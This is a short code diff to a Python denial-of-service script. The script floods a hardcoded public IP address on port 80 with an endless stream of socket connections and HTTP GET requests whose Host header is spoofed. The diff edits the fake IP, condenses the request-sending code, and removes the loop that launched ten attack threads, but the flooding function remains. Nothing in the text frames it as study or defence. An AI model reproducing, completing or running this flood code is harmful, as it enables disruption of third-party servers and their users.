@@ -1,14 +1,13 @@
 import socket
 import threading
 
-# Target IP and fake IP for spoofing (use a valid IP address)
 target = "217.15.165.191"
-fake_ip = "192.168.1.100"  # Correct fake IP (use a valid one)
+fake_ip = "277.15.165.199"
 port = 80
 
 attack_num = 0
 
-# Attack function
+
 def attack():
     global attack_num
     while True:
@@ -18,8 +17,8 @@ def attack():
             soc.connect((target, port))
 
             # Send HTTP GET request with fake headers
-            soc.sendto(("GET / HTTP/1.1\r\n").encode("ascii"), (target, port))
-            soc.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"), (target, port))
+            request = f"GET / HTTP/1.1\r\nHost: {fake_ip}\r\n\r\n"
+            soc.send(request.encode("ascii"))
 
             # Increment the attack counter
             attack_num += 1
@@ -30,8 +29,3 @@ def attack():
         except Exception as e:
             print(f"Error occurred: {e}")
             continue
-
-# Create and start multiple threads to launch the attack
-for i in range(10):
-    thread = threading.Thread(target=attack)
-    thread.start()
